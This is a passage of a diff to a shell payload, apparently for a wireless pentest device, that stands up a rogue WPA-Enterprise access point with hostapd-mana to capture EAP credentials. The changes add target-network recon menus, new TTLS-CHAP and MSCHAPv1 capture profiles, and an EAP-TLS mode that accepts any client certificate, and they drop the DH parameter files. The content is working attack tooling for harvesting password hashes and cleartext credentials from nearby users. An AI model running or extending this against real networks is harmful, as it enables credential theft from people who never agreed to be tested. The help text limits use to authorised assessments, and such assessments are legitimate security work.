-    TARGET_CHANNEL="${resp:-$DEFAULT_CHANNEL}"
 
+    TARGET_CHANNEL="${resp:-$DEFAULT_CHANNEL}"
     TARGET_BSSID=""
     TARGET_SIGNAL=""
+
+    logboth green "Manual target selected: SSID='$TARGET_SSID'"
+    logboth blue "Manual target channel: $TARGET_CHANNEL"
+
     return 0
+}
+
+
+#
+# Menu shown when a scan completes successfully but does not discover any
+# WPA-Enterprise APs.
+#
+no_enterprise_results_menu() {
+    local selected
+
+    selected=$(ui_list_picker \
+        "No WPA-Enterprise Networks" \
+        "Rescan" \
+        "Rescan" \
+        "Enter network manually" \
+        "<- Back") || return 2
+
+    case "$selected" in
+        "Rescan")
+            return 0
+            ;;
+
+        "Enter network manually")
+            return 1
+            ;;
+
+        *)
+            return 2
+            ;;
+    esac
+}
+
+
+#
+# Menu shown when phy1 exists but none of its interfaces can successfully
+# perform an iwinfo scan.
+#
+scan_failed_menu() {
+    local selected
+
+    selected=$(ui_list_picker \
+        "WiFi Scan Failed" \
+        "Retry" \
+        "Retry" \
+        "Enter network manually" \
+        "<- Back") || return 2
+
+    case "$selected" in
+        "Retry")
+            return 0
+            ;;
+
+        "Enter network manually")
+            return 1
+            ;;
+
+        *)
+            return 2
+            ;;
+    esac
+}
+
+
+#
+# Complete Phase 1 state machine.
+#
+recon_target_menu() {
+    local selected
+    local scan_result
+    local menu_result
+
+    while true; do
+        selected=$(ui_list_picker \
+            "Target Network" \
+            "Scan for networks" \
+            "Scan for networks" \
+            "Enter network manually") || return 1
+
+        case "$selected" in
+            "Enter network manually")
+                if manual_target_entry; then
+                    return 0
+                fi
+
+                #
+                # Cancel from manual entry returns to this menu rather than
+                # terminating the complete payload.
+                #
+                continue
+                ;;
+
+            "Scan for networks")
+                while true; do
+                    scan_enterprise_networks
+                    scan_result=$?
+
+                    case "$scan_result" in
+                        0)
+                            if select_enterprise_ssid; then
+                                return 0
+                            fi
+
+                            #
+                            # Back from the SSID list returns to Target Network.
+                            #
+                            break
+                            ;;
+
+                        2)
+                            no_enterprise_results_menu
+                            menu_result=$?
+
+                            case "$menu_result" in
+                                0)
+                                    # Rescan.
+                                    continue
+                                    ;;
+
+                                1)
+                                    if manual_target_entry; then
+                                        return 0
+                                    fi
+
+                                    # Cancel manual entry -> no-results menu.
+                                    continue
+                                    ;;
+
+                                *)
+                                    # Back -> Target Network.
+                                    break
+                                    ;;
+                            esac
+                            ;;
+
+                        *)
+                            scan_failed_menu
+                            menu_result=$?
+
+                            case "$menu_result" in
+                                0)
+                                    # Retry.
+                                    continue
+                                    ;;
+
+                                1)
+                                    if manual_target_entry; then
+                                        return 0
+                                    fi
+
+                                    # Cancel manual entry -> failed-scan menu.
+                                    continue
+                                    ;;
+
+                                *)
+                                    # Back -> Target Network.
+                                    break
+                                    ;;
+                            esac
+                            ;;
+                    esac
+                done
+                ;;
+
+            *)
+                return 1
+                ;;
+        esac
+    done
 }
 
 # ============================================
@@ -1407,7 +2369,6 @@ normalize_certificate_settings() {
     [ "$CERT_DAYS" -lt 1 ] 2>/dev/null && CERT_DAYS=3650
     case "$CERT_RENEW_BEFORE_DAYS" in ''|*[!0-9]*) CERT_RENEW_BEFORE_DAYS=30 ;; esac
     case "$CERT_KEY_BITS" in 2048|3072|4096) ;; *) CERT_KEY_BITS=2048 ;; esac
-    case "$CERT_DH_BITS" in 1024|2048|3072|4096) ;; *) CERT_DH_BITS=2048 ;; esac
 }
 
 load_certificate_profile() {
@@ -1432,7 +2393,6 @@ load_certificate_profile() {
             CERT_IP_SANS) CERT_IP_SANS="$value" ;;
             CERT_DAYS) CERT_DAYS="$value" ;;
             CERT_KEY_BITS) CERT_KEY_BITS="$value" ;;
-            CERT_DH_BITS) CERT_DH_BITS="$value" ;;
             CERT_RENEW_BEFORE_DAYS) CERT_RENEW_BEFORE_DAYS="$value" ;;
         esac
     done < "$profile_file"
@@ -1453,7 +2413,6 @@ write_certificate_profile() {
         echo "CERT_IP_SANS=$CERT_IP_SANS"
         echo "CERT_DAYS=$CERT_DAYS"
         echo "CERT_KEY_BITS=$CERT_KEY_BITS"
-        echo "CERT_DH_BITS=$CERT_DH_BITS"
         echo "CERT_RENEW_BEFORE_DAYS=$CERT_RENEW_BEFORE_DAYS"
     } > "$CERT_DIR/profile.conf"
     chmod 600 "$CERT_DIR/profile.conf" 2>/dev/null
@@ -1501,8 +2460,6 @@ edit_certificate_profile_values() {
     case "$number" in ''|*[!0-9]*) ;; *) CERT_DAYS="$number" ;; esac
     number=$(NUMBER_PICKER "RSA key bits (2048/3072/4096)" "$CERT_KEY_BITS")
     case "$number" in 2048|3072|4096) CERT_KEY_BITS="$number" ;; esac
-    number=$(NUMBER_PICKER "DH bits (1024/2048/3072/4096)" "$CERT_DH_BITS")
-    case "$number" in 1024|2048|3072|4096) CERT_DH_BITS="$number" ;; esac
     normalize_certificate_settings
 }
 
@@ -1615,7 +2572,6 @@ generate_certs() {
     if [ "$CERT_FORCE_REGENERATE" -eq 0 ] && \
        [ -f "$CERT_DIR/ca.pem" ] && [ -f "$CERT_DIR/ca.key" ] && \
        [ -f "$CERT_DIR/server.pem" ] && [ -f "$CERT_DIR/server.key" ] && \
-       [ -f "$CERT_DIR/dh.pem" ] && \
        [ "$current_fingerprint" = "$stored_fingerprint" ] && \
        openssl x509 -checkend "$renew_seconds" -noout -in "$CERT_DIR/server.pem" >/dev/null 2>&1; then
         logboth green "Reusing certificate profile: $CERT_PROFILE"
@@ -1694,18 +2650,14 @@ EOF
         -days "$CERT_DAYS" -extfile "$openssl_config" \
         -extensions v3_server 2>/dev/null
 
-    # DH parameters (1024-bit for speed on ARM)
-    logboth "  - Generating DH parameters..."
-    openssl dhparam -out "$generation_dir/dh.pem" "$CERT_DH_BITS" 2>/dev/null
-
     STOP_SPINNER $sid
 
     if [ -f "$generation_dir/ca.pem" ] && [ -f "$generation_dir/server.pem" ] && \
-       [ -f "$generation_dir/server.key" ] && [ -f "$generation_dir/dh.pem" ] && \
+       [ -f "$generation_dir/server.key" ] && \
        openssl verify -CAfile "$generation_dir/ca.pem" "$generation_dir/server.pem" >/dev/null 2>&1; then
         cp "$generation_dir/ca.pem" "$generation_dir/ca.key" \
-            "$generation_dir/server.pem" "$generation_dir/server.key" \
-            "$generation_dir/dh.pem" "$CERT_DIR/" || return 1
+        "$generation_dir/server.pem" "$generation_dir/server.key" \
+        "$CERT_DIR/" || return 1
         echo "$current_fingerprint" > "$CERT_DIR/settings.sha256"
         cp "$CERT_DIR/profile.conf" "$SESSION_CONFIG_DIR/certificate-profile.conf"
         openssl x509 -in "$CERT_DIR/server.pem" -noout -fingerprint -sha256 \
@@ -1782,7 +2734,7 @@ write_eap_user_file() {
 # Phase 2 - MANA WPE rewrites the lookup identity to "t".
 # The dummy password permits MSCHAPv2 challenge/response capture; unknown
 # passwords are not expected to authenticate successfully.
-"t" MSCHAPV2,GTC,TTLS-PAP,TTLS-MSCHAPV2 "password" [2]
+"t" MD5,MSCHAPV2,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2 "password" [2]
 EAPEOF
             ;;
         peap-mschapv2)
@@ -1803,6 +2755,18 @@ EAPEOF
 "t" TTLS-PAP "password" [2]
 EAPEOF
             ;;
+        ttls-chap)
+            cat > "$EAP_USER_FILE" << 'EAPEOF'
+* TTLS
+"t" TTLS-CHAP "password" [2]
+EAPEOF
+            ;;
+        ttls-mschap)
+            cat > "$EAP_USER_FILE" << 'EAPEOF'
+* TTLS
+"t" TTLS-MSCHAP "password" [2]
+EAPEOF
+            ;;
         ttls-mschapv2)
             cat > "$EAP_USER_FILE" << 'EAPEOF'
 * TTLS
@@ -1810,6 +2774,11 @@ EAPEOF
 EAPEOF
             ;;
         eap-tls)
+            cat > "$EAP_USER_FILE" << 'EAPEOF'
+* TLS
+EAPEOF
+            ;;
+        eap-tls-accept-any)
             cat > "$EAP_USER_FILE" << 'EAPEOF'
 * TLS
 EAPEOF
@@ -1847,8 +2816,11 @@ eap_profile_label() {
         peap-mschapv2) printf '%s' "PEAP + MSCHAPv2 [hash]" ;;
         peap-gtc) printf '%s' "PEAP + GTC [cleartext]" ;;
         ttls-pap) printf '%s' "TTLS + PAP [cleartext]" ;;
+        ttls-chap) printf '%s' "TTLS + CHAP [hash]" ;;
+        ttls-mschap) printf '%s' "TTLS + MSCHAPv1 [hash]" ;;
         ttls-mschapv2) printf '%s' "TTLS + MSCHAPv2 [hash]" ;;
         eap-tls) printf '%s' "EAP-TLS [certificate]" ;;
+        eap-tls-accept-any) printf '%s' "EAP-TLS [accept client cert]" ;;
         fast) printf '%s' "FAST + MSCHAPv2/GTC" ;;
         md5) printf '%s' "EAP-MD5" ;;
         *) printf '%s' "Broad / automatic" ;;
@@ -1863,8 +2835,11 @@ select_eap_profile() {
         "PEAP + MSCHAPv2 [hash]"
         "PEAP + GTC [cleartext]"
         "TTLS + PAP [cleartext]"
+        "TTLS + CHAP [hash]"
+        "TTLS + MSCHAPv1 [hash]"
         "TTLS + MSCHAPv2 [hash]"
         "EAP-TLS [certificate]"
+        "EAP-TLS [accept client cert]"
         "FAST + MSCHAPv2/GTC"
         "EAP-MD5"
         "$help_option"
@@ -1881,7 +2856,10 @@ Broad: lets the client negotiate.
 PEAP/MSCHAPv2: captures a challenge-response hash.
 GTC and TTLS/PAP: may expose cleartext credentials.
 TTLS/MSCHAPv2: captures a challenge-response hash.
+TTLS/CHAP and TTLS/MSCHAPv1: legacy challenge-response methods.
 EAP-TLS: client certificate authentication; no password.
+EAP-TLS accept client cert: accepts any presented client certificate; use only
+to test client-certificate authentication in explicitly authorized scope.
 FAST: permits MSCHAPv2 or GTC.
 MD5: legacy challenge-response.
 
@@ -1890,8 +2868,11 @@ Press OK to return."
             "PEAP + MSCHAPv2 [hash]") EAP_PROFILE="peap-mschapv2"; break ;;
             "PEAP + GTC [cleartext]") EAP_PROFILE="peap-gtc"; break ;;
             "TTLS + PAP [cleartext]") EAP_PROFILE="ttls-pap"; break ;;
+            "TTLS + CHAP [hash]") EAP_PROFILE="ttls-chap"; break ;;
+            "TTLS + MSCHAPv1 [hash]") EAP_PROFILE="ttls-mschap"; break ;;
             "TTLS + MSCHAPv2 [hash]") EAP_PROFILE="ttls-mschapv2"; break ;;
             "EAP-TLS [certificate]") EAP_PROFILE="eap-tls"; break ;;
+            "EAP-TLS [accept client cert]") EAP_PROFILE="eap-tls-accept-any"; break ;;
             "FAST + MSCHAPv2/GTC") EAP_PROFILE="fast"; break ;;
             "EAP-MD5") EAP_PROFILE="md5"; break ;;
             "Broad / automatic") EAP_PROFILE="broad"; break ;;
@@ -1906,6 +2887,7 @@ Press OK to return."
 write_hostapd_config() {
     local ssid="$1"
     local channel="$2"
+    local mana_eaptls=0
 
     logboth "Configuring hostapd for SSID: '$ssid'"
 
@@ -1930,6 +2912,12 @@ write_hostapd_config() {
     if [ "$channel" -gt 14 ] 2>/dev/null; then
         hw_mode="a"
     fi
+
+    case "$EAP_PROFILE" in
+        eap-tls-accept-any)
+            mana_eaptls=1
+            ;;
+    esac
 
     cat > "$HOSTAPD_CONF" << HOSTAPDEOF
 # pinEAPol hostapd-mana configuration
@@ -1956,7 +2944,6 @@ fragment_size=1260
 ca_cert=$CERT_DIR/ca.pem
 server_cert=$CERT_DIR/server.pem
 private_key=$CERT_DIR/server.key
-dh_file=$CERT_DIR/dh.pem
 
 # Logging
 logger_syslog=-1
@@ -1964,14 +2951,14 @@ logger_syslog_level=0
 logger_stdout=-1
 logger_stdout_level=0
 
-# MANA WPE capture. Karma, forced success, and accept-any-certificate modes
-# remain disabled; only the dedicated EAP credential writer is enabled.
+# MANA WPE capture. Karma and forced success remain disabled. Accepting an
+# arbitrary EAP-TLS client certificate is enabled only by its explicit profile.
 mana_wpe=1
 mana_credout=$MANA_CREDOUT
 enable_mana=0
 mana_loud=0
 mana_eapsuccess=0
-mana_eaptls=0
+mana_eaptls=$mana_eaptls
 
 # Operational Tweaks
 ap_isolate=0
@@ -3214,7 +4201,7 @@ LOG yellow "      \\       /"
 LOG yellow "       '-----'"
 LOG ""
 LOG red "  WPA-Enterprise EAP Capture"
-LOG red "  v3.5"
+LOG red "  v3.6"
 LOG ""
 
 # Confirm start
@@ -3258,38 +4245,22 @@ LOG ""
 LOG blue "=== PHASE 1: RECON ==="
 led_recon
 
-scan_enterprise_networks
-
-if [ "$ENTERPRISE_COUNT" -gt 0 ]; then
-    if ! select_target; then
-        # User pressed B for manual entry
-        if ! manual_target_entry; then
-            LOG "Cancelled"
-            exit 0
-        fi
-    fi
-else
-    LOG yellow "No enterprise APs found"
-
-    resp=$(CONFIRMATION_DIALOG "No enterprise APs found.
-Enter SSID manually?")
-    case $? in
-        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
-            exit 0
-            ;;
-    esac
-
-    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
-        if ! manual_target_entry; then
-            LOG "Cancelled"
-            exit 0
-        fi
-    else
-        exit 0
-    fi
+if ! recon_target_menu; then
+    LOG "Cancelled"
+    exit 0
 fi
 
-logboth green "Target: $TARGET_SSID (Ch $TARGET_CHANNEL)"
+if [ -n "$TARGET_BSSID" ]; then
+    logboth green "Target: $TARGET_SSID"
+    logboth blue "BSSID: $TARGET_BSSID"
+    logboth blue "Channel: $TARGET_CHANNEL"
+    logboth blue "Signal: ${TARGET_SIGNAL}dBm"
+else
+    logboth green "Target: $TARGET_SSID"
+    logboth blue "Channel: $TARGET_CHANNEL"
+    logboth blue "Source: manual entry"
+fi
+
 rename_session_for_target
 
 # ── PHASE 2: SETUP ─────────────────────────
